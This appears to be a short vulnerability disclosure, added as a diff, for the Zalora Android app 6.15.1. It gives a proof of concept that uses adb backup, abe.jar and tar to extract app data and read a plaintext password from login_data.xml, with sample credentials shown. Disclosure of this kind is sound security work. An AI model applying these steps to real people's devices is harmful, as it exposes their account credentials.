@@ -1,0 +1,26 @@
+# Application: Zalora
+# Platform: Android
+# Version: 6.15.1 (latest)
+# Severity: Medium
+# Impact: None-root user can read the password in clear-text and login to the application.
+# Author: Loc Phan Van
+
+POC: 
+
+1. Backups application data into Local PC
+adb backup -f ~/zalora.ab -noapk com.zalora.android
+
+2. Converts file "zalora.ab" into tar file(file contains backup data of com.zalora.android)
+java -jar abe.jar unpack ~/zalora.ab zalora.tar ""
+
+3. Extracts tar file.
+tar -xvf zalora.tar
+
+4. After the extraction, goes and checks the data in the directory located in apps/com.zalora.android/
+
+5. Looks for sensitive data. The password stored in /shared_prefs/login_data.xml in plain-text
+
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="login_data">{&quot;password&quot;:&quot;P4ssw0rd123&quot;,&quot;email&quot;:&quot;testme@gmail.com&quot;}</string>
+</map>
